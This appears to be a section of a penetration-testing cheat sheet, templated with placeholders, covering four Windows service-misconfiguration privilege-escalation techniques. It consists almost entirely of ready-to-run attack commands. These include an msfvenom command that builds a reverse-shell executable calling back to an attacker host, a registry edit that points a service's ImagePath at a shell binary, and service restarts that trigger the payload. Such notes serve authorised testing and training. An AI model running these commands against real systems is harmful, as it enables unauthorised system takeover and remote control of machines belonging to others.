# === SERVICE ATTACKS (FOUR VARIANTS - check all four) ===
# 1. Unquoted service path - space in path without quotes = hijack
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """
# Create malicious binary at the unquoted path location
msfvenom -p windows/shell_reverse_tcp LHOST={{KALI}} LPORT={{KALI_PORT}} -f exe -o "C:\Program Files\Vulnerable Path\Service.exe"
sc stop {{SERVICE}} && sc start {{SERVICE}}

# 2. Writable service binary - replace the binary directly
.\accesschk64.exe {{USER}} -wvu "C:\Program Files" -accepteula
# Replace with malicious binary then restart service
sc stop {{SERVICE}} && sc start {{SERVICE}}

# 3. Writable service directory - drop malicious DLL or binary
icacls "C:\Program Files\{{SERVICE_PATH}}"

# 4. Weak service registry permissions
.\accesschk64.exe -kwsu "Authenticated Users" HKLM\System\CurrentControlSet\Services -accepteula
# If writable - change ImagePath
reg add "HKLM\SYSTEM\CurrentControlSet\Services\{{SERVICE}}" /t REG_EXPAND_SZ /v ImagePath /d "C:\Windows\Temp\shell.exe" /f
sc stop {{SERVICE}} && sc start {{SERVICE}}
